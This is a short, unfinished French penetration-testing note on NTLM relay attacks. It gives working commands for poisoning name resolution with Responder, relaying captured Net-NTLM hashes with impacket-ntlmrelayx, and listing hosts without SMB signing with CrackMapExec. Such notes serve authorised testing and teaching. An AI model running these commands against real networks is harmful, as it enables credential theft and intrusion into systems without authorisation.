---
description: A finir
---

# NTLM Relay

Prendre la dernière version de Responder ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder))

### Ecoute passive

```
sudo responder -I eth0
```

Les _hashs_ NT utilisé dans la version 1 et 2 du protocole NTLM (a.k.a Net-NTLMv1-SSP et Net-NTLMv2-SSP) peuvent être relayés.

### Relayer

Pour pouvoir relayer, il faut que les services SMB et HTTP de Responder soit stoppés (fichier de configuration Responder.conf).

```
# Terminal 1
sudo responder -I eth0 -r -d -w

# Terminal 2
sudo impacket-ntlmrelayx -tf <TARGETS.txt>
```

Le fichier `TARGETS.txt` contient les IP des machines dont la signature SMB n'est pas activée. Cette liste de machine peut être récupérée avec la commande suivante :&#x20;

```
cme smb <IP>/<MASK> --gen-relay-list <TARGETS.txt>
```
